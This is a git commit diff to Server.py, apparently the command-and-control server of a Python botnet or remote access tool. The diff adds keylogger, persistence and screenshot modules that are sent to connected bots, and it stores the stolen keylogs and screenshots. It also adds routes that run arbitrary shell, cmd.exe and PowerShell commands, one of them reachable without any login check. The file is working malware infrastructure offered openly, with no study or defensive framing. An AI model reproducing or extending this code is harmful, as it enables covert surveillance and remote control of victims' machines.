7965612314e6c6bfc0102f46ac2e32790ef6e5e8
Yasir Mehmood <152008995+TheLeopard65@users.noreply.github.com>
2024-03-11 00:19:16 +0500

    Update Server.py

--- Server.py
+++ Server.py
@@ -1,5 +1,7 @@
-from flask import *
+from flask import Flask, request, render_template, redirect, url_for, session, jsonify
 from flask_socketio import SocketIO
+import subprocess, keylogger, persistence, screenshot
+from requests import post, get
 
 app = Flask(__name__)
 socketio = SocketIO(app)
@@ -12,6 +14,7 @@ database = []
 completedTasks = []
 screenshotNumber = 0
 keyloggerNumber = 0
+persistenceVariable = False
 
 class TaskDone:
     def __init__(self, info):
@@ -55,27 +58,131 @@ def dashboard():
         return render_template('dashboard.html', database=database)
     return redirect(url_for('login'))
 
-@app.route('/commands.html', methods=['GET', 'POST'])
-def commands():
+@app.route('/modules.html', methods=['GET', 'POST'])
+def modules():
     if session.get('loggedin'):
         if request.method == 'POST':
             idNumber = request.form.get('idNumber')
             command = request.form.get('command')
+            hostname = None
+            client_info = next((client for client in database if client.idNum == int(idNumber)), None)
 
-            if command in ['keylogger', 'persistence', 'screenshot']:
-                communication = {'newTask': command, 'idNum': idNumber}
-                socketio.emit('message', communication)
-                return render_template('commands.html', commandStatus='Command Sent', taskDb=completedTasks)
+            if client_info:
+                hostname = client_info.hostname
 
-            for x in database:
-                if str(x.idNum) == str(idNumber):
-                    communication = {'newTask': command, 'idNum': x.idNum}
-                    socketio.emit('message', communication, room=x.sid)
-
-            return render_template('commands.html', commandStatus='Command Sent', taskDb=completedTasks)
-        else:
-            return render_template('commands.html', taskDb=completedTasks)
+            if command == 'keylogger':
+                keylogger_output = keylogger.start_keylogger()
+                if keylogger_output:
+                    completedTasks.append(TaskDone({
+                        'idNum': idNumber,
+                        'hostname': hostname,
+                        'commandSent': 'KEYLOGGER',
+                        'DATA': "Keylogger start Failed"
+                    }))
+                else:
+                    completedTasks.append(TaskDone({
+                        'idNum': idNumber,
+                        'hostname': hostname,
+                        'commandSent': 'KEYLOGGER',
+                        'DATA': "Keylogger started"
+                    }))
+            elif command == 'persistence':
+                try:
+                    persistence_output = persistence.try_persistence()
+                    completedTasks.append(TaskDone({
+                        'idNum': idNumber,
+                        'hostname': hostname,
+                        'commandSent': 'PERSISTENCE',
+                        'DATA': "Persistence command executed successfully"
+                    }))
+                except Exception as e:
+                    completedTasks.append(TaskDone({
+                        'idNum': idNumber,
+                        'hostname': hostname,
+                        'commandSent': 'PERSISTENCE',
+                        'DATA': f"Error executing persistence command: {str(e)}"
+                    }))
+            elif command == 'screenshot':
+                output_dir = r'./static/receivedData/screenshots/'
+                screenshot_path = screenshot.take_screenshot(output_dir)
+                if isinstance(screenshot_path, str):
+                    completedTasks.append(TaskDone({
+                        'idNum': idNumber,
+                        'hostname': hostname,
+                        'commandSent': 'SCREENSHOT',
+                        'DATA': f"Screenshot taken and saved at: {screenshot_path}"
+                    }))
+                else:
+                    completedTasks.append(TaskDone({
+                        'idNum': idNumber,
+                        'hostname': hostname,
+                        'commandSent': 'SCREENSHOT',
+                        'DATA': f"Error Taking Screenshot: {screenshot_path}"
+                    }))
+        return render_template('modules.html', taskDb=completedTasks)
     return redirect(url_for('login'))
+
+@app.route('/commands.html', methods=['GET', 'POST'])
+def commands():
+    if request.method == 'POST':
+        user_command = request.form['command']
+        output = run_command(user_command)
+        return render_template('commands.html', output=output)
+    return render_template('commands.html')
+
+@app.route('/execute_command', methods=['POST'])
+def execute_command():
+    data = request.json
+    bot_id = data.get('botId')
+    command = data.get('command')
+
+    if not bot_id:
+        return jsonify({'result': 'Single command executed on multiple bots'})
+
+    result = run_command(command)
+    return jsonify({'result': result})
+
+def run_command(command):
+    try:
+        if command.startswith("shell"):
+            args = command.split()[1:]
+            f = "cmd.exe"
+            arg = "/c "
+            for a in args:
+                arg += a + " "
+        elif command.startswith("powershell"):
+            args = command.split()[1:]
+            f = "powershell.exe"
+            arg = "-Command "
+            for a in args:
+                arg += a + " "
+        else:
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, error = process.communicate()
+            output_str = output.decode('utf-8') if output else ""
+            error_str = error.decode('utf-8') if error else ""
+
+            if error_str:
+                result = f"Error: {error_str}"
+            else:
+                result = f"Output: {output_str}"
+
+            return result
+
+        process = subprocess.Popen([f, arg], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, error = process.communicate()
+        output_str = output.decode('utf-8') if output else ""
+        error_str = error.decode('utf-8') if error else ""
+
+        if error_str:
+            result = f"Error: {error_str}"
+        else:
+            result = f"Output: {output_str}"
+
+        return result
+
+    except Exception as e:
+        return f"Error: {str(e)}"
 
 @app.route('/logout.html')
 def logout():
@@ -101,17 +208,17 @@ def handleMessage(message):
 
             if "screenshot" in message['commandSent']:
                 global screenshotNumber
-                with open('./static/receivedData/screenshots/' + str(screenshotNumber) + '.png', 'wb') as f:
+                with open(f'./static/receivedData/screenshots/screenshot_{screenshotNumber}.png', 'wb') as f:
                     f.write(message['DATA'])
-                    tmp = '/static/receivedData/screenshots/' + str(screenshotNumber) + '.png'
+                    tmp = f'/static/receivedData/screenshots/screenshot_{screenshotNumber}.png'
                     message['DATA'] = tmp
                     screenshotNumber += 1
 
             if 'keylogger' in message['commandSent']:
                 global keyloggerNumber
-                with open('./static/receivedData/keylogs/' + str(keyloggerNumber) + '.txt', 'w') as f:
+                with open(f'./static/receivedData/keylogs/keylogs_{keyloggerNumber}.txt', 'w') as f:
                     f.write(message['DATA'])
-                    tmp = '/static/receivedData/keylogs/' + str(keyloggerNumber) + '.txt'
+                    tmp = f'/static/receivedData/keylogs/keylogs_{keyloggerNumber}.txt'
                     message['DATA'] = tmp
                     keyloggerNumber += 1
 
